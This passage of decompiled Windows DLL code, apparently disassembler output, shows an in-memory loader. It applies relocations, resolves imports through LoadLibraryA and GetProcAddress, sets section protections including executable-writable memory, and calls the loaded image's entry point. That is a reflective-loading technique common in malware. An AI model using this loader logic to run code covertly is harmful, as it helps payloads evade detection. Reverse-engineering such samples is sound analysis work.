              if ((uVar4 & 0xf000) == 0xa000) {
                plVar1 = (longlong *)
                         ((longlong)lpAddress + (ulonglong)(uVar4 & 0xfff) + (ulonglong)*puVar11);
                *plVar1 = (longlong)lpAddress + *plVar1 + -0x180000000;
              }
              uVar14 = uVar14 + 1;
            } while ((uVar13 + 0x1fffffff8 >> 1 & 0xffffffff) != uVar14);
            uVar13 = (ulonglong)puVar11[1];
          }
          piVar2 = (int *)((longlong)puVar11 + uVar13);
          puVar11 = (uint *)((longlong)puVar11 + uVar13);
        } while (*piVar2 != 0);
      }
      uVar7 = *(uint *)((longlong)lpAddress + 0x5c28);
      if (uVar7 != 0) {
        puVar11 = (uint *)((longlong)lpAddress + 0x5c1c);
        do {
          hModule = LoadLibraryA((LPCSTR)((ulonglong)uVar7 + (longlong)lpAddress));
          if (hModule == (HMODULE)0x0) {
            hModule = GetModuleHandleA((LPCSTR)((ulonglong)uVar7 + (longlong)lpAddress));
          }
          uVar7 = puVar11[4];
          uVar13 = (ulonglong)uVar7;
          if (*puVar11 != 0) {
            uVar13 = (ulonglong)*puVar11;
          }
          uVar14 = *(ulonglong *)((longlong)lpAddress + uVar13);
          pvVar12 = lpAddress;
          while (uVar14 != 0) {
            if ((longlong)uVar14 < 0) {
              lpProcName = (LPCSTR)(uVar14 & 0xffff);
            }
            else {
              lpProcName = (LPCSTR)((longlong)lpAddress + uVar14 + 2);
            }
            pFVar9 = GetProcAddress(hModule,lpProcName);
            *(FARPROC *)((longlong)pvVar12 + (ulonglong)uVar7) = pFVar9;
            puVar3 = (ulonglong *)((longlong)pvVar12 + uVar13 + 8);
            pvVar12 = (LPVOID)((longlong)pvVar12 + 8);
            uVar14 = *puVar3;
          }
          uVar7 = puVar11[8];
          puVar11 = puVar11 + 5;
        } while (uVar7 != 0);
      }
      VirtualProtect(lpAddress,0x400,2,&local_44);
      lVar8 = 0;
      do {
        bVar15 = (*(uint *)(&DAT_180006fb4 + lVar8) >> 0x1d & 1) == 0;
        DVar10 = 0x20;
        if (bVar15) {
          DVar10 = 2;
        }
        flNewProtect = 0x40;
        if (bVar15) {
          flNewProtect = 4;
        }
        if (-1 < (int)*(uint *)(&DAT_180006fb4 + lVar8)) {
          flNewProtect = DVar10;
        }
        VirtualProtect((LPVOID)((ulonglong)*(uint *)((longlong)&DAT_180006f9c + lVar8) +
                               (longlong)lpAddress),
                       (ulonglong)*(uint *)((longlong)&DAT_180006f98 + lVar8),flNewProtect,&local_44
                      );
        lVar8 = lVar8 + 0x28;
      } while (lVar8 != 200);
      (*(code *)((longlong)lpAddress + 0x3338))(lpAddress,1,0);
    }
  }
  return 1;
}


